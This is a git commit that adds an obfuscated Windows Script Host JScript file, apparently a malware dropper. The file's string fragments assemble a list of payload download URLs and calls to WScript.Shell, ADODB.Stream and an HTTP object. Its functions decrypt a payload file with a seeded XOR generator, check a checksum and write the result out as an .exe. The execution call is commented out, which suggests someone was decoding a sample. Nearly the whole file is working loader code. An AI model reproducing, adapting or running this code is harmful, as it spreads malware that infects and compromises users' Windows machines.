e122dabfe59cc1035cefa8e0652480907baf77a7
Tarmo <tarmo.randel@gmail.com>
2016-07-14 14:10:50 +0300

    Add files via upload

---
+++ profile-cb85.js
@@ -0,0 +1,694 @@
+var SKAg0 = "close";
+var SKIRz = "File";
+var HCb = "To";
+var NQt7 = "Save";
+var ZHc5 = "t";
+var QUx4 = "eTex";
+var JVVVr = "writ";
+var IWy = "en";
+var Xk8 = "op";
+var Ga = "et";
+var NNYRg = "Chars";
+var EFFs3 = "e";
+var YTr4 = "typ";
+var Xg = "am";
+var Pd4 = ".Stre";
+var QKPIk8 = "ADODB";
+var NRZu = "ject";
+var Kk = "eOb";
+var WKSl8 = "Creat";
+var Gl = "join";
+function RXf(MZj){return MZj;};var OISc = "ode";
+var Qp = "arC";
+var DCf9 = "Ch";
+var VBo = "om";
+var LRIAi8 = "fr";
+var CYh3 = "ngth";
+var IMOc = "le";
+var BPIm6 = "push";
+var SFFCd = "eAt";
+var ZFv = "od";
+var NIj = "charC";
+var Td6 = "ngth";
+var IUBq2 = "le";
+var Kg = "close";
+var JUh7 = "Text";
+var Aj5 = "Read";
+function Wt0(URKx2){return URKx2;};var MVx6 = "ile";
+var HGOl = "mF";
+var If8 = "Fro";
+var Jy1 = "ad";
+var RWe7 = "Lo";
+var AMh = "open";
+function NZMFf(LIHIv){return LIHIv;};var HJi = "et";
+var YRt = "rs";
+var YAn = "Cha";
+var MJy = "e";
+var UKb = "typ";
+var LGr = "eam";
+var VBk6 = "B.Str";
+var RZu = "OD";
+var VUs1 = "AD";
+var LFi4 = "ct";
+var Ip = "bje";
+var XMJh5 = "eO";
+var ABSk = "Creat";
+var YTLi0 = "zda";
+var XZGRv9 = "pi";
+var VYg3 = "gth";
+var HNn9 = "len";
+var WDq = "h";
+var Hj1 = "gt";
+var Iq3 = "len";
+var TPXOt8 = "e";
+var UMAw = "splic";
+var DPMCm = "h";
+var KIEc = "lengt";
+var WIp = "th";
+var XOg = "leng";
+var SZn1 = "h";
+var Cf6 = "lengt";
+var GTx = "h";
+var MFb = "ngt";
+var QQWx = "le";
+var DFc3 = "gth";
+var Xa6 = "len";
+var Oj1 = "Sleep";
+var YUo = "1";
+var Bj = " 32";
+var KNj = "Run";
+var Lb = "th";
+var RNh1 = "leng";
+var VLj2 = "th";
+var Jy = "ng";
+var AJu5 = "le";
+function ZVMIy3(Ff7){return Ff7;};function ERBRs0(YUq){return YUq;};function UQKo4(Qm1){return Qm1;};var NYq = "e";
+var Vz = "clos";
+var KAPn = "oFile";
+var Nc = "SaveT";
+function RMQu(PFm9){return PFm9;};function VPDPs(ZSZf1){return ZSZf1;};var Xy8 = "n";
+var VOVo1 = "tio";
+var YKb = "si";
+var RMWHg0 = "po";
+var GMp = "y";
+var Ja = "od";
+var OBq = "seB";
+var Kx = "pon";
+var Dj = "Res";
+var Uh = "e";
+var SPTq = "it";
+var KKRXu6 = "wr";
+var IDm1 = "e";
+var Ph = "typ";
+var DEKJq4 = "en";
+var Ry6 = "op";
+var NVPh = "eam";
+var PWTf1 = ".Str";
+var Uy1 = "ADODB";
+var VNZv7 = "t";
+var Pa3 = "bjec";
+var Kl7 = "teO";
+var AZz = "Crea";
+var Fh2 = "p";
+var ZTm = "Slee";
+var CMNAm = "nd";
+var SWn3 = "se";
+var MVi1 = "gth";
+var SWSVi = "len";
+var XZt9 = "GET";
+function FLj4(Tl){return Tl;};var Ro4 = "en";
+var PQb = "op";
+function ZOSd(JQw4){return JQw4;};var Df6 = "eep";
+var LYFPd = "Sl";
+var Mx = "h";
+var Cp7 = "lengt";
+var ZJUj = "ject";
+var OYa = "eOb";
+var AVNb = "Creat";
+var Ww = "h";
+var WEh = "ngt";
+var JCEYh = "le";
+var QOGt = "TTP";
+var LEv = "LH";
+var Vd3 = "L2.XM";
+var GZFd = "MSXM";
+var ZNQx8 = "5.1";
+var RWo = "est.";
+var Zd = "equ";
+var GWRq = "tpR";
+var IFn = "nHt";
+var ZWXGl = ".Wi";
+var UNLw9 = "tp";
+var HIq9 = "Ht";
+var SVt = "Win";
+var DRRKf = "+/";
+var CBCx = "56789";
+var Pe2 = "234";
+var HGGn9 = "xyz01";
+var SGUl = "stuvw";
+var AFm8 = "qr";
+var Uz = "lmnop";
+var YHBJd = "ghijk";
+var GBREd7 = "cdef";
+var Vb5 = "ab";
+var PNw = "WXYZ";
+var Jv4 = "UV";
+var Hq = "PQRST";
+var Kp = "KLMNO";
+var Uw = "IJ";
+var KVf = "GH";
+var GDUc = "DEF";
+var OOb = "ABC";
+var ONy = "xe";
+var Az = ".e";
+function YEi4(ZMz7){return ZMz7;};var DKXu = "l5";
+var NOr3 = "ldos";
+var Pz0 = "dIl";
+var ACXa = "MP%/";
+var FQGm1 = "%TE";
+function Pz(PIy){return PIy;};var SVGj2 = "ell";
+var TCt = ".Sh";
+var AKZHa = "pt";
+var Dx = "WScri";
+function EZn7(WQCn0){return WQCn0;};var JJx = "t";
+var Iw6 = "ec";
+var YHn = "eObj";
+var UBNy = "eat";
+var Qa4 = "Cr";
+var IFv = "c";
+var Vh2 = "qo";
+var WBMSm3 = "g";
+var Oa = "u5";
+var NNx6 = "nu";
+function IOLd(FQMYa3){return FQMYa3;};var VLa2 = "m/";
+var SSVd = ".co";
+var MJEn = "e";
+var VNi9 = "oart";
+var EDe7 = "sic";
+var LUNt8 = "rsip";
+var Qu5 = "erco";
+var OAUYy9 = "p";
+var HIWLy0 = "//";
+var JBv = ":";
+var JKw = "http";
+var WOXf2 = "9";
+var Yj8 = "z";
+var RYZu4 = "yf";
+function Pc0(HYo){return HYo;};var VXFDz3 = "y";
+var GGj7 = "m/h";
+var Mn4 = "es.co";
+var ADSt2 = "emedi";
+var UMe = "ty-r";
+function Um(NXOc){return NXOc;};var TZv3 = "nxie";
+function VLv5(Os1){return Os1;};var MTXUp = "a";
+var CKb = "l-";
+var Pu = "ra";
+var XIAa = "u";
+var ETq3 = "nat";
+var MEHWy = "//";
+var Ke = "p:";
+var KSd = "htt";
+var JPQq4 = "5k";
+var JUh = "7";
+var Lt = "f4";
+var GHWw2 = "/o8";
+var Zh = "84";
+function SJRf(SKf){return SKf;};var FMPPe = ".192.";
+var UEa = "4.232";
+var KAUo = "://20";
+var UOh5 = "tp";
+var Pq = "ht";
+var Gu = "7";
+var GYg = "43";
+var PRPf = "h";
+var WTVk9 = "lengt";
+var LEl = "333";
+function Ph9(WGXw){return WGXw;};var AOOPn = "d";
+var AMy4 = "dfasf";
+var RENq9 = "asfas";
+var RUe = "ngth";
+var TBv5 = "le";
+var VXy3 = "33";
+var ZZc = "333";
+var UXg7 = "3333";
+var DJAw2 = "333";
+var GRAu0 = "33333";
+function QVIs(ZAi5){return ZAi5;};function QDQl(JOKj4){return JOKj4;};function DGx(RTq){return RTq;};function Ib7(Gv9){return Gv9;};function REo(DMd7){return DMd7;};var Pc = "h";
+var Xv = "lengt";
+function ANt7(QYHh4){return QYHh4;};function MSd0(IVLm7){return IVLm7;};function OTFi1(XVXa6){return XVXa6;};var YUTq5 = "33";
+var DPf8 = "3333";
+var RBVh8 = "33";
+var MVu9 = "33";
+var UBz2 = "33333";
+var WNTDx5 = "33";
+function MTSUi4(CUOVz9){return CUOVz9;};var WZy5 = "32";
+var OZAGs = "31";
+var ZJv0 = "112";
+var De=((function BBs1(){return ZJv0;}()) + OZAGs + MTSUi4(WZy5), ANt7(WNTDx5) + UBz2 + (function Pf3(){return MVu9;}()) + RBVh8 + DPf8 + YUTq5);
+var QJa=De[Xv + Pc];
+var LOe=(WNTDx5 + MSd0(UBz2) + OTFi1(MVu9) + RBVh8 + DPf8 + YUTq5);
+var MOm = 0.998105;
+var WJLr3=LOe[Xv + Pc];
+var PHi=(Ph9(RENq9) + AMy4 + AOOPn, LEl);
+var LEAc=PHi[Xv + Pc];
+
+var LUj=1;
+var HMNz=2;
+var PKd=7350 - 7348;
+var PEAo1="437";
+
+// urls
+var KUXf=[Pq + UOh5+KAUo+UEa+SJRf(FMPPe)+Zh + (function EVj0(){return GHWw2;}())+Lt + JUh+JPQq4, KSd + (function NWGd(){return Ke;}())+MEHWy+ETq3 + XIAa+Pu + CKb + VLv5(MTXUp)+Um(TZv3)+UMe+ADSt2+Mn4+GGj7 + Pc0(VXFDz3)+RYZu4 + Yj8+(function MUBDz5(){return WOXf2;}()), KSd + Ke+HIWLy0 + OAUYy9+Qu5+LUNt8+EDe7+VNi9 + MJEn+IOLd(SSVd) + VLa2+NNx6 + Oa + WBMSm3+Vh2 + (function YMFd8(){return IFv;}())];
+// create environment
+var ZLn4=WScript[Qa4 + UBNy + YHn + Iw6 + (function OTj5(){return JJx;}())](Dx + Pz(AKZHa) + TCt + SVGj2);
+// get temp path
+var BHIf=ZLn4.ExpandEnvironmentStrings(FQGm1 + ACXa);
+
+// filename
+// var Tx=BHIf + Pz0 + YEi4(NOr3) + DKXu;
+var Tx="e:\\o8f475k.data";
+// filename w exe
+var VCRBj=Tx + Az + ONy;
+
+function uheprng() {
+	return (function() {
+  		var o = 48;
+		var c = 1;
+		var p = o;
+		var s = new Array(o);
+		var i,j;
+		var base64chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
+
+		var mash = Mash();
+		for (i = 0; i < o; i++) s[i] = mash(MOm);
+        mash = null;
+
+        
+        var random = function( range ) {
+			return Math.floor(range * (rawprng() + (rawprng() * 0x200000 | 0) * 1.1102230246251565e-16));
+		}
+        
+        
+		function rawprng() {
+			if (++p >= o) p = 0;
+			var t = (1766664 + 2199) * s[p] + c * 2.3283064365386963e-10;
+      	return s[p] = t - (c = t | (6039 - 6039));
+		}
+		
+		return random;
+  }());
+};
+
+function Mash() {
+	var n = 0xefc8249d;
+	var mash = function(data) {
+		if ( data ) {
+			data = data.toString();
+			for (var i = 0; i < data.length; i++) {
+				n += data.charCodeAt(i);
+				var h = 0.02519603282416938 * n;
+				n = h >>> 0;
+				h -= n;
+				h *= n;
+				n = h >>> 0;
+				h -= n;
+				n += h * 0x100000000;
+			}
+			return (n >>> 0) * 2.3283064365386963e-10;
+		} else n = 0xefc8249d;
+	};
+  return mash;
+}
+
+var WAk8=9485 - 9484;
+var Ba=0;
+
+var Vt=LYUo(Tx);
+Vt=DTx(Vt);
+
+// leftover ...
+LTs7(VCRBj, Vt);
+
+WScript.Quit(0);
+
+// ZLn4[KNj](VCRBj + Bj + YUo);
+
+WScript.Quit(0);
+
+function DTx(ACp5)
+{
+	var NNBLl;
+	
+	var YTLi = uheprng();
+	for (var Pg3=0; Pg3 < ACp5[Xv + Pc]; Pg3++)
+	{
+		ACp5[Pg3] ^= YTLi(-254 + 510);
+	}
+
+	var NJx3=ACp5[ACp5[Xv + Pc]-4] | ACp5[ACp5[Xv + Ib7(Pc)]-3] << 8 | ACp5[ACp5[Xv + Pc]-2] << (4 * 4) | ACp5[ACp5[Xv + (function RDc9(){return Pc;}())]-1] << 24;	
+	ACp5[(function TJj6(){return UMAw;}()) + TPXOt8](Vt[Xv + Pc]-4, 2 * 2);
+	
+	NNBLl=QJa;
+	for (var Pg3=0; Pg3 < ACp5[Xv + REo(Pc)]; Pg3++)
+	{
+		NNBLl=(NNBLl + ACp5[Pg3]) % 0x100000000;
+	};
+	if (NNBLl != NJx3) {WScript.Echo(XZGRv9 + (function WHYLr5(){return YTLi0;}()));return []};
+	
+	return ACp5;
+};
+
+
+function Xu9 /* V  */(ACp5)
+{
+	if (ACp5[0]== 0x4D && ACp5[1]== 0x5a)
+		{return true;}
+	else
+		{return false;}
+};
+
+
+function LYUo(POYRp3)
+{
+    var Ge=WScript[Qa4 + UBNy + YHn + Iw6 + JJx](Uy1 + PWTf1 + NVPh);
+    Ge[Ph + IDm1]=HMNz;
+    Ge[YAn + YRt + HJi]=PEAo1;
+    Ge[(function LQs9(){return PQb;}()) + Ro4]();
+    Ge[RWe7 + Jy1 + Wt0(If8) + HGOl + MVx6](POYRp3);
+    var QSf7=Ge[Aj5 + JUh7];
+    Ge[ERBRs0(Vz) + UQKo4(NYq)]();
+    return NDn2(QSf7);
+};
+
+
+function NDn2(BCs1)
+{   
+    var HOAt1=new Array();
+	
+    HOAt1[0xC7]=0x80;
+    HOAt1[0xFC]=0x81;
+    HOAt1[0xE9]=0x82;
+    HOAt1[0xE2]=0x83;
+    HOAt1[0xE4]=0x84;
+    HOAt1[0xE0]=0x85;
+    HOAt1[0xE5]=0x86;
+    HOAt1[0xE7]=0x87;
+    HOAt1[0xEA]=0x88;
+    HOAt1[0xEB]=0x89;
+    HOAt1[0xE8]=0x8A;
+    HOAt1[0xEF]=0x8B;
+    HOAt1[0xEE]=0x8C;
+    HOAt1[0xEC]=0x8D;
+    HOAt1[0xC4]=0x8E;
+    HOAt1[0xC5]=0x8F;
+    HOAt1[0xC9]=0x90;
+    HOAt1[0xE6]=0x91;
+    HOAt1[0xC6]=0x92;
+    HOAt1[0xF4]=0x93;
+    HOAt1[0xF6]=0x94;
+    HOAt1[0xF2]=0x95;
+    HOAt1[0xFB]=0x96;
+    HOAt1[0xF9]=0x97;
+    HOAt1[0xFF]=0x98;
+    HOAt1[0xD6]=0x99;
+    HOAt1[0xDC]=0x9A;
+    HOAt1[0xA2]=0x9B;
+    HOAt1[0xA3]=0x9C;
+    HOAt1[0xA5]=0x9D;
+    HOAt1[0x20A7]=0x9E;
+    HOAt1[0x192]=0x9F;
+    HOAt1[0xE1]=0xA0;
+    HOAt1[0xED]=0xA1;
+    HOAt1[0xF3]=0xA2;
+    HOAt1[0xFA]=0xA3;
+    HOAt1[0xF1]=0xA4;
+    HOAt1[0xD1]=0xA5;
+    HOAt1[0xAA]=0xA6;
+    HOAt1[0xBA]=0xA7;
+    HOAt1[0xBF]=0xA8;
+    HOAt1[0x2310]=0xA9;
+    HOAt1[0xAC]=0xAA;
+    HOAt1[0xBD]=0xAB;
+    HOAt1[0xBC]=0xAC;
+    HOAt1[0xA1]=0xAD;
+    HOAt1[0xAB]=0xAE;
+    HOAt1[0xBB]=0xAF;
+    HOAt1[0x2591]=0xB0;
+    HOAt1[0x2592]=0xB1;
+    HOAt1[0x2593]=0xB2;
+    HOAt1[0x2502]=0xB3;
+    HOAt1[0x2524]=0xB4;
+    HOAt1[0x2561]=0xB5;
+    HOAt1[0x2562]=0xB6;
+    HOAt1[0x2556]=0xB7;
+    HOAt1[0x2555]=0xB8;
+    HOAt1[0x2563]=0xB9;
+    HOAt1[0x2551]=0xBA;
+    HOAt1[0x2557]=0xBB;
+    HOAt1[0x255D]=0xBC;
+    HOAt1[0x255C]=0xBD;
+    HOAt1[0x255B]=0xBE;
+    HOAt1[0x2510]=0xBF;
+    HOAt1[0x2514]=0xC0;
+    HOAt1[0x2534]=0xC1;
+    HOAt1[0x252C]=0xC2;
+    HOAt1[0x251C]=0xC3;          
+    HOAt1[0x2500]=0xC4;
+    HOAt1[0x253C]=0xC5;
+    HOAt1[0x255E]=0xC6;
+    HOAt1[0x255F]=0xC7;
+    HOAt1[0x255A]=0xC8;
+    HOAt1[0x2554]=0xC9;
+    HOAt1[0x2569]=0xCA;
+    HOAt1[0x2566]=0xCB;
+    HOAt1[0x2560]=0xCC;
+    HOAt1[0x2550]=0xCD;
+    HOAt1[0x256C]=0xCE;
+    HOAt1[0x2567]=0xCF;
+    HOAt1[0x2568]=0xD0;
+    HOAt1[0x2564]=0xD1;
+    HOAt1[0x2565]=0xD2;
+    HOAt1[0x2559]=0xD3;
+    HOAt1[0x2558]=0xD4;
+    HOAt1[0x2552]=0xD5;
+    HOAt1[0x2553]=0xD6;
+    HOAt1[0x256B]=0xD7;
+    HOAt1[0x256A]=0xD8;
+    HOAt1[0x2518]=0xD9;
+    HOAt1[0x250C]=0xDA;
+    HOAt1[0x2588]=0xDB;
+    HOAt1[0x2584]=0xDC;
+    HOAt1[0x258C]=0xDD;
+    HOAt1[0x2590]=0xDE;
+    HOAt1[0x2580]=0xDF;
+    HOAt1[0x3B1]=0xE0;
+    HOAt1[0xDF]=0xE1;
+    HOAt1[0x393]=0xE2;
+    HOAt1[0x3C0]=0xE3;
+    HOAt1[0x3A3]=0xE4;
+    HOAt1[0x3C3]=0xE5;
+    HOAt1[0xB5]=0xE6;
+    HOAt1[0x3C4]=0xE7;
+    HOAt1[0x3A6]=0xE8;
+    HOAt1[0x398]=0xE9;
+    HOAt1[0x3A9]=0xEA;
+    HOAt1[0x3B4]=0xEB;                                                              
+    HOAt1[0x221E]=0xEC;
+    HOAt1[0x3C6]=0xED;
+    HOAt1[0x3B5]=0xEE;
+    HOAt1[0x2229]=0xEF;
+    HOAt1[0x2261]=0xF0;
+    HOAt1[0xB1]=0xF1;
+    HOAt1[0x2265]=0xF2;
+    HOAt1[0x2264]=0xF3;
+    HOAt1[0x2320]=0xF4;
+    HOAt1[0x2321]=0xF5;
+    HOAt1[0xF7]=0xF6;
+    HOAt1[0x2248]=0xF7;
+    HOAt1[0xB0]=0xF8;
+    HOAt1[0x2219]=0xF9;
+    HOAt1[0xB7]=0xFA;
+    HOAt1[0x221A]=0xFB;
+    HOAt1[0x207F]=0xFC;
+    HOAt1[0xB2]=0xFD;
+    HOAt1[0x25A0]=0xFE;
+    HOAt1[0xA0]=0xFF;
+	
+	var Vt=new Array();
+	for (var Pg3=1 * 0; Pg3 < BCs1[Xv + Pc]; Pg3++)
+	{
+		var SRCAj8=BCs1[NIj + ZFv + SFFCd](Pg3);
+		if (SRCAj8 < (-191 + 319))
+			{var ZQNs9=SRCAj8;}
+		else
+			{var ZQNs9=HOAt1[SRCAj8];}
+		Vt[(function Es0(){return BPIm6;}())](ZQNs9);
+	};
+	
+	return Vt;
+};
+
+
+function QMg4(ACp5)
+{
+    var BCm=new Array();
+	
+    BCm[0x80]=0x00C7;
+    BCm[0x81]=0x00FC;
+    BCm[0x82]=0x00E9;
+    BCm[0x83]=0x00E2;
+    BCm[0x84]=0x00E4;
+    BCm[0x85]=0x00E0;
+    BCm[0x86]=0x00E5;
+    BCm[0x87]=0x00E7;
+    BCm[0x88]=0x00EA;
+    BCm[0x89]=0x00EB;
+    BCm[0x8A]=0x00E8;
+    BCm[0x8B]=0x00EF;
+    BCm[0x8C]=0x00EE;
+    BCm[0x8D]=0x00EC;
+    BCm[0x8E]=0x00C4;
+    BCm[0x8F]=0x00C5;
+    BCm[0x90]=0x00C9;
+    BCm[0x91]=0x00E6;
+    BCm[0x92]=0x00C6;
+    BCm[0x93]=0x00F4;
+    BCm[0x94]=0x00F6;
+    BCm[0x95]=0x00F2;
+    BCm[0x96]=0x00FB;
+    BCm[0x97]=0x00F9;
+    BCm[0x98]=0x00FF;
+    BCm[0x99]=0x00D6;
+    BCm[0x9A]=0x00DC;
+    BCm[0x9B]=0x00A2;
+    BCm[0x9C]=0x00A3;
+    BCm[0x9D]=0x00A5;
+    BCm[0x9E]=0x20A7;
+    BCm[0x9F]=0x0192;
+    BCm[0xA0]=0x00E1;
+    BCm[0xA1]=0x00ED;
+    BCm[0xA2]=0x00F3;
+    BCm[0xA3]=0x00FA;
+    BCm[0xA4]=0x00F1;
+    BCm[0xA5]=0x00D1;
+    BCm[0xA6]=0x00AA;
+    BCm[0xA7]=0x00BA;
+    BCm[0xA8]=0x00BF;
+    BCm[0xA9]=0x2310;
+    BCm[0xAA]=0x00AC;
+    BCm[0xAB]=0x00BD;
+    BCm[0xAC]=0x00BC;
+    BCm[0xAD]=0x00A1;
+    BCm[0xAE]=0x00AB;
+    BCm[0xAF]=0x00BB;
+    BCm[0xB0]=0x2591;
+    BCm[0xB1]=0x2592;
+    BCm[0xB2]=0x2593;
+    BCm[0xB3]=0x2502;
+    BCm[0xB4]=0x2524;
+    BCm[0xB5]=0x2561;
+    BCm[0xB6]=0x2562;
+    BCm[0xB7]=0x2556;
+    BCm[0xB8]=0x2555;
+    BCm[0xB9]=0x2563;
+    BCm[0xBA]=0x2551;
+    BCm[0xBB]=0x2557;
+    BCm[0xBC]=0x255D;
+    BCm[0xBD]=0x255C;
+    BCm[0xBE]=0x255B;
+    BCm[0xBF]=0x2510;
+    BCm[0xC0]=0x2514;
+    BCm[0xC1]=0x2534;
+    BCm[0xC2]=0x252C;
+    BCm[0xC3]=0x251C;
+    BCm[0xC4]=0x2500;
+    BCm[0xC5]=0x253C;
+    BCm[0xC6]=0x255E;
+    BCm[0xC7]=0x255F;
+    BCm[0xC8]=0x255A;
+    BCm[0xC9]=0x2554;
+    BCm[0xCA]=0x2569;
+    BCm[0xCB]=0x2566;
+    BCm[0xCC]=0x2560;
+    BCm[0xCD]=0x2550;
+    BCm[0xCE]=0x256C;
+    BCm[0xCF]=0x2567;
+    BCm[0xD0]=0x2568;
+    BCm[0xD1]=0x2564;
+    BCm[0xD2]=0x2565;
+    BCm[0xD3]=0x2559;
+    BCm[0xD4]=0x2558;
+    BCm[0xD5]=0x2552;
+    BCm[0xD6]=0x2553;
+    BCm[0xD7]=0x256B;
+    BCm[0xD8]=0x256A;
+    BCm[0xD9]=0x2518;
+    BCm[0xDA]=0x250C;
+    BCm[0xDB]=0x2588;
+    BCm[0xDC]=0x2584;
+    BCm[0xDD]=0x258C;
+    BCm[0xDE]=0x2590;
+    BCm[0xDF]=0x2580;
+    BCm[0xE0]=0x03B1;
+    BCm[0xE1]=0x00DF;
+    BCm[0xE2]=0x0393;
+    BCm[0xE3]=0x03C0;
+    BCm[0xE4]=0x03A3;
+    BCm[0xE5]=0x03C3;
+    BCm[0xE6]=0x00B5;
+    BCm[0xE7]=0x03C4;
+    BCm[0xE8]=0x03A6;
+    BCm[0xE9]=0x0398;
+    BCm[0xEA]=0x03A9;
+    BCm[0xEB]=0x03B4;
+    BCm[0xEC]=0x221E;
+    BCm[0xED]=0x03C6;
+    BCm[0xEE]=0x03B5;
+    BCm[0xEF]=0x2229;
+    BCm[0xF0]=0x2261;
+    BCm[0xF1]=0x00B1;
+    BCm[0xF2]=0x2265;
+    BCm[0xF3]=0x2264;
+    BCm[0xF4]=0x2320;
+    BCm[0xF5]=0x2321;
+    BCm[0xF6]=0x00F7;
+    BCm[0xF7]=0x2248;
+    BCm[0xF8]=0x00B0;
+    BCm[0xF9]=0x2219;
+    BCm[0xFA]=0x00B7;
+    BCm[0xFB]=0x221A;
+    BCm[0xFC]=0x207F;
+    BCm[0xFD]=0x00B2;
+    BCm[0xFE]=0x25A0;
+    BCm[0xFF]=0x00A0;
+	
+	var VFm9=new Array();
+	var QXTc4="";
+	var ZQNs9; var SRCAj8;
+	for (var Pg3=0; Pg3 < ACp5[Xv + Pc]; Pg3++)
+	{
+		ZQNs9=ACp5[Pg3];
+		if (ZQNs9 < 128) 
+			{SRCAj8=ZQNs9;}
+		else 
+			{SRCAj8=BCm[ZQNs9];}
+		VFm9.push(String[LRIAi8 + (function Ok5(){return VBo;}()) + DCf9 + Qp + RXf(OISc)](SRCAj8));
+	}
+	
+	QXTc4=VFm9[(function Rv1(){return Gl;}())]("");
+	
+	return QXTc4;
+};
+
+
+function LTs7(POYRp3, ACp5)
+{
+    var Ge=WScript[Qa4 + UBNy + YHn + Iw6 + EZn7(JJx)](Uy1 + PWTf1 + NVPh);
+    Ge[Ph + IDm1]=HMNz;
+    Ge[NZMFf(YAn) + YRt + HJi]=PEAo1;         
+    Ge[PQb + (function Jw(){return Ro4;}())]();
+    Ge[JVVVr + QUx4 + (function WSk(){return ZHc5;}())](QMg4(ACp5));
+    Ge[Nc + KAPn](POYRp3, -5526 + 5528);
+
+    Ge[Vz + NYq]();
+};
